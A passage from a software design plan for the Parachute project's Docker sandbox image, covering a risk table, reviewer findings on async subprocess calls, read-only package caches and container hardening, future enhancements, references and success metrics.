| **Playwright browser download fails** | Medium | Low | Make optional via build arg, fallback to no-browser workflow |
| **Event loop blocking from subprocess.run** | High | High | MITIGATED: All subprocess.run replaced with asyncio variants |
| **Cache poisoning attack** | High | Critical | MITIGATED: Cache volumes mounted :ro, cache-builder pattern |
| **Container pooling breaks isolation** | N/A | Critical | DEFERRED: Pooling moved to Phase 6 (future) |

---

## Critical Findings from Research

### Must Fix Before Implementation

1. **All `subprocess.run()` must be async** (python-reviewer, performance-oracle, architecture-strategist)
   - Current plan uses blocking subprocess calls in async methods
   - Will freeze FastAPI event loop, degrading SSE streaming
   - Replace with `asyncio.create_subprocess_exec()` throughout

2. **Cache volumes must be read-only** (security-sentinel, parachute-conventions-reviewer)
   - Shared read-write cache enables cross-workspace code injection
   - Workspace A can trojan packages for Workspace B
   - Use cache-builder pattern with `:ro` mounts

3. **Container pooling deferred** (all reviewers)
   - Breaks workspace isolation (scratch dirs, .claude mounts, volume mounts)
   - Requires fundamental redesign to maintain guarantees
   - Implement preparation (labels, hashing) but not actual pooling

4. **Increase config hash length** (security-sentinel, architecture-strategist)
   - 8 chars = 50% collision at ~77k configs
   - Use 12 chars (48 bits) = 1% collision at ~600M configs
   - Store full hash in labels

5. **Remove Phase 4 (auto-install)** (python-reviewer, security-sentinel, parachute-conventions-reviewer)
   - Code is unreachable (sandbox uses bypassPermissions)
   - Regex patterns trivially bypassable
   - If logging needed, implement in entrypoint, not permission handler

### Architectural Improvements

6. **Vault mount path change** (new)
   - Change from `/vault` to `~/Parachute` for SDK consistency
   - Matches host convention (`~/Parachute`)
   - Update all path handling in entrypoint and sandbox.py

7. **Security hardening** (docker-researcher, security-sentinel)
   - Add `--cap-drop=ALL`, `--security-opt=no-new-privileges`, `--pids-limit=256`
   - Add `--restart=unless-stopped` for persistent containers
   - Verify NodeSource setup script checksum before execution

8. **Dockerfile optimizations** (docker-researcher)
   - Use `--no-install-recommends` (saves ~100MB)
   - Add BuildKit cache mounts for pip (70% faster rebuilds)
   - Pin pip ≥ 24.0 for concurrent cache safety
   - Make Playwright optional via build arg

---

## Future Enhancements

**Beyond initial implementation:**

1. **Container pooling (Phase 6)**
   - Redesign to maintain workspace isolation:
     - Per-exec mount namespaces for workspace paths
     - Per-session scratch directories with permission enforcement
     - `CLAUDE_HOME` env var per docker exec for separate `.claude` dirs
   - Implement collision detection and fallback
   - Add `max_concurrent_sessions` limit per pooled container
   - Scale memory limits proportionally to pool size

2. **Workspace image customization**
   - Allow Dockerfile per workspace: `vault/.parachute/workspaces/{slug}/Dockerfile`
   - Build custom images: `parachute workspace build {slug}`
   - Use case: ML workflows with CUDA, specific Python versions

3. **Image variants**
   - Minimal: Current size (~781MB), no pre-installed tools
   - Standard: New size (~900MB), common tools (default)
   - Full: ~1.2GB, includes Playwright and ML libraries

4. **uv as pip replacement**
   - 10-100x faster than pip
   - Better concurrent cache handling
   - Drop-in replacement: `uv pip install`

5. **Cache warming**
   - Pre-populate cache on server startup: `populate_package_cache(["pandas", "requests", ...])`
   - Background job to download popular packages
   - Reduces first-install latency to near-zero

6. **Container health monitoring**
   - Detect hung processes (stuck >10min)
   - Auto-restart unhealthy containers
   - Metrics: memory usage, CPU, process count

7. **Desktop Extension equivalents**
   - Bundle MCP servers + dependencies into workspace templates
   - Gallery: "Data Science", "Web Dev", "Research" templates
   - One-click workspace creation from gallery

---

## References & Research

### Internal References

**Current sandbox implementation:**
- `computer/parachute/core/sandbox.py:1-871` - Container lifecycle, volume mounting
- `computer/parachute/docker/Dockerfile.sandbox:1-34` - Current minimal image
- `computer/parachute/docker/entrypoint.py:1-239` - SDK execution inside container
- `computer/parachute/models/workspace.py:1-175` - Workspace config models

**Existing patterns:**
- Asyncio subprocess calls: `sandbox.py:89, 111, 495`
- OOM detection and cleanup: `sandbox.py:667-677`
- Volume mounting strategy: `sandbox.py:121-187`
- Container reconciliation: `sandbox.py:834-871`

### External References

**Brainstorm:**
- Issue #69: "Rich Sandbox Image with Efficient Storage"
- Brainstorm file: `docs/brainstorms/2026-02-18-rich-sandbox-image-brainstorm.md`

**Docker:**
- Named volumes: https://docs.docker.com/storage/volumes/
- BuildKit cache mounts: https://docs.docker.com/build/cache/optimize/
- Security hardening: https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html
- macOS VirtioFS: https://www.docker.com/blog/speed-boost-achievement-unlocked-on-docker-desktop-4-6-for-mac/

**Python packaging:**
- pip cache: https://pip.pypa.io/en/stable/topics/caching/
- pip concurrent safety: https://github.com/pypa/pip/issues/12361 (fixed in pip 24+)
- uv alternative: https://realpython.com/uv-vs-pip/

**npm:**
- npm cache: https://docs.npmjs.com/cli/v10/commands/npm-cache
- npm config: https://docs.npmjs.com/cli/v10/using-npm/config

**Research findings:**
- Alpine vs Debian for Python: https://pythonspeed.com/articles/alpine-docker-python/
- Docker volume performance on macOS: https://eastondev.com/blog/en/posts/dev/20251217-docker-mount-comparison/
- BuildKit speed improvements: https://pythonspeed.com/articles/docker-cache-pip-downloads/

---

## Success Metrics

**User experience:**
- Zero "ModuleNotFoundError" for common tasks (pandas, requests, PyPDF2)
- Package installs cached and reused (80%+ cache hit rate)
- Non-developers don't need to understand dependencies

**Efficiency:**
- Shared package cache reduces redundant downloads by 80%+
- Image build time < 3 minutes with BuildKit cache (vs 5+ minutes cold)
- Cache volume size < 5GB with periodic cleanup

**Security:**
- Cache volumes read-only - no cross-workspace poisoning
- Container hardening flags applied (cap-drop, no-new-privileges)
- No event loop blocking from synchronous subprocess calls

**Developer experience:**
- Clear documentation: what's pre-installed, cache behavior, security model
- `parachute sandbox inspect` shows resource usage with warnings
- `parachute sandbox clean-cache --trim` offers incremental cleanup
